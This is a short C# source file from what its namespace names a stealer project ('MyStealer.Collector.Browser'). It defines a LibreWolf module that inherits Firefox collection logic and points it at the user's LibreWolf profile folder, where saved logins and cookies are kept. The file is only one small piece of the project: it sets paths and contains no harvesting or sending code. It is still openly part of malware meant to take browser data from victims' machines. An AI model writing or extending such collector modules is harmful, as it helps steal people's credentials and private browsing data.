using System;
using System.IO;

namespace MyStealer.Collector.Browser.FirefoxBased
{
    public class LibreWolf : Firefox
    {
        public override string ModuleName => "LibreWolf";

        protected override string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "librewolf", "Profiles");

        public override string[] LibDirectory => new string[] { "LibreWolf" };
    }
}
